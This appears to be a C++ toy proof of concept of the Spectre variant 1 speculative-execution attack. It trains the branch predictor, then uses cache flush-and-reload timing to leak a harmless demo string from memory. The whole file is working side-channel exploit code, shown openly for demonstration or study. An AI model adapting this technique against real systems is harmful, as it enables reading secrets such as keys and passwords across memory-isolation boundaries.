#include <stdio.h>
#include <stdlib.h>
#include <intrin.h>
#include <cstdint>

extern "C" {
  uint64_t memory_access(void *target);
  void branch_predictor(uint64_t relative_target,
                        void *basepos,
                        uint32_t *comparer,
                        void *probe_start);
}

const char TheAnswer[] = "Answer to the Ultimate Question of Life, The Universe, and Everything is 42";
constexpr int probe_lines = 256;
uint64_t tat[probe_lines];
uint32_t array1_size = 16;
uint8_t array1[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
uint8_t probe[probe_lines * 4096];

void spectre_toy(const void *target_address) {
  for (int trial = 0; ; ++trial) {
    for (int i = 0; i < probe_lines; i++)
      _mm_clflush(&probe[i * 4096]);

    uint64_t train_and_attack[12] = {};
    train_and_attack[5]
      = train_and_attack[11]
      = reinterpret_cast<uint64_t>(target_address) - reinterpret_cast<uint64_t>(array1);

    for (auto x : train_and_attack) {
      _mm_clflush(&array1_size);
      branch_predictor(x, array1, &array1_size, probe);
    }

    for (int i = 0; i < probe_lines; i++)
      tat[i] = memory_access(&probe[i * 4096]);

    int idx_min = array1_size, idx_max = array1_size;
    for (int i = array1_size; i < probe_lines; ++i) {
      if (tat[i] < tat[idx_min]) idx_min = i;
      if (tat[i] > tat[idx_max]) idx_max = i;
    }

    if (tat[idx_min] < 100) {
      printf("trial#%d: guess='%c' (score=%llu)\n", trial, idx_min, tat[idx_min]);
      for (int i = 0; i < probe_lines; ++i) {
        if ((i + 1) % 16 == 0)
          printf("% 6llu\n", tat[i]);
        else
          printf("% 6llu", tat[i]);
      }
      break;
    }
  }
}

int main(int argc, const char **argv) {
  spectre_toy(TheAnswer + (argc >= 2 ? atoi(argv[1]) : 0));
  return 0;
}
